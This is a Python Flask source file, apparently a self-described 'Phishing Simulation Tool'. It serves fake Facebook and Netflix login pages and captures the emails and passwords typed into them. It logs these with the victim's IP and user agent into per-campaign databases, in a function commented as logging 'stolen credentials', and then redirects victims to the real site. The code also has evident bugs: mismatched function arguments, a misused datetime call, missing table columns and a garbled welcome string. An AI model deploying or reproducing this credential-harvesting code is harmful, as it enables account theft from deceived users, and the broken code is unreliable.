import os
import jwt
import hashlib
import sqlite3
from datetime import datetime
from flask_cors import CORS
from flask import Flask, render_template, request, redirect, jsonify

app = Flask(__name__)
CORS(app)
DB_NAME = "dbs"

SECRET_KEY = "your_secret_key"  # Change this to a secure key

def hash_password(password):
    return hashlib.sha256(password.encode()).hexdigest()

def generate_token(username, user_id):
    payload = {
        "username": username,
        "id": user_id,  # Add the user_id to the token
        "exp": datetime.datetime.utcnow() + datetime.timedelta(hours=1)  # Token expires in 1 hour
    }
    return jwt.encode(payload, SECRET_KEY, algorithm="HS256")

def create_campaign_db(user_id, campaign_name):
    user_folder = f"{DB_NAME}/{user_id}"
    if not os.path.exists(user_folder):
        os.makedirs(user_folder)

    campaign_db_path = os.path.join(user_folder, f"{campaign_name}.db")

    if os.path.exists(campaign_db_path):
        return None 

    conn = sqlite3.connect(campaign_db_path)
    cursor = conn.cursor()

    cursor.execute('''
    CREATE TABLE IF NOT EXISTS credentials (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        username TEXT NOT NULL,
        password TEXT NOT NULL,
        page TEXT NOT NULL
    )
    ''')
    conn.commit()
    conn.close()

    return campaign_db_path

def fetch_campaign_data(db_path):
    """Fetch content from a specific campaign database."""
    conn = sqlite3.connect(db_path)
    cursor = conn.cursor()

    cursor.execute("SELECT * FROM credentials")
    campaigns = cursor.fetchall()

    conn.close()
    return campaigns

@app.route('/campaigns/<user_id>', methods=['GET'])
def get_campaigns(user_id):
    user_db_folder = os.path.join(DB_NAME, user_id)
    
    if not os.path.exists(user_db_folder):
        return jsonify({"error": "User database folder not found"}), 404
    
    campaign_db_files = [f for f in os.listdir(user_db_folder) if f.endswith('.db')]
    
    campaigns_with_data = []

    for db_file in campaign_db_files:
        db_path = os.path.join(user_db_folder, db_file)

        campaign_data = fetch_campaign_data(db_path)
        
        campaigns_with_data.append({
            "db_name": db_file,
            "data": campaign_data
        })

    return jsonify(campaigns_with_data), 200
    

@app.route('/campaigns/create', methods=['POST'])
def create_campaign():
    data = request.json
    user_id = data.get("user_id")
    campaign_name = data.get("name")


    if not user_id or not campaign_name:
        return jsonify({"error": "User ID and campaign name are required"}), 400

    campaign_db_path = create_campaign_db(user_id, campaign_name)

    if campaign_db_path:
        return jsonify({"message": "Campaign created successfully", "db_path": campaign_db_path}), 200
    else:
        return jsonify({"error": "Campaign already exists"}), 409
    
@app.route('/login', methods=['POST'])
def login():
    data = request.json
    username = data.get("username")
    password = hash_password(data.get("password"))

    conn = sqlite3.connect(f"{DB_NAME}/user.db")
    cursor = conn.cursor()
    
    cursor.execute("SELECT id, username FROM users WHERE username=? AND password=?", (username, password))
    user = cursor.fetchone()
    conn.close()

    if user:
        user_id, username = user  
        token = generate_token(username, user_id)  
        return jsonify({"token": token}), 200
    else:
        return jsonify({"error": "Invalid credentials"}), 401


@app.route('/')
def home():
    """Landing page (could redirect to an actual site)"""
    return "WelDB_FOLDERcome to Phishing Simulation Tool"

@app.route('/campaign/<user_id>/<campaign_name>', methods=['GET', 'POST'])
def campaign_page(user_id, campaign_name):
    """ Serve the phishing page and handle form submissions """
    
    campaign_db_path = os.path.join(DB_NAME, user_id, f"{campaign_name}.db")

    if not os.path.exists(campaign_db_path):
        return "Campaign not found", 404


    if request.method == 'POST':
        username    = request.form.get('email')
        password = request.form.get('pass')

        if username and password:
            log_credentials(campaign_db_path, "Facebook", username, password)

            
        
    return "True", 200

@app.route('/facebook', methods=['GET', 'POST'])
def facebook():
    """Fake Facebook login page"""
    if request.method == 'POST':
        username = request.form.get('email')
        password = request.form.get('pass')
        log_credentials("Facebook", username, password)
        return redirect("https://www.facebook.com/")  # Redirect after capturing
        
    return render_template('facebook.html')

@app.route('/netflix', methods=['GET', 'POST'])
def netflix():
    """Fake Netflix login page"""
    if request.method == 'POST':
        username = request.form.get('email')
        password = request.form.get('password')
        log_credentials("Netflix", username, password)
        return redirect("https://www.netflix.com/")  # Redirect after capturing

    return render_template('netflix.html')

def log_credentials(db, page, username, password):
    """Log stolen credentials into SQLite database"""
    ip = request.remote_addr
    user_agent = request.headers.get('User-Agent')
    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')

    conn = sqlite3.connect(db)
    cursor = conn.cursor()
    cursor.execute("""
        INSERT INTO credentials (page, username, password, ip, user_agent, timestamp)
        VALUES (?, ?, ?, ?, ?, ?)
    """, (page, username, password, ip, user_agent, timestamp))
    
    conn.commit()
    conn.close()

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)
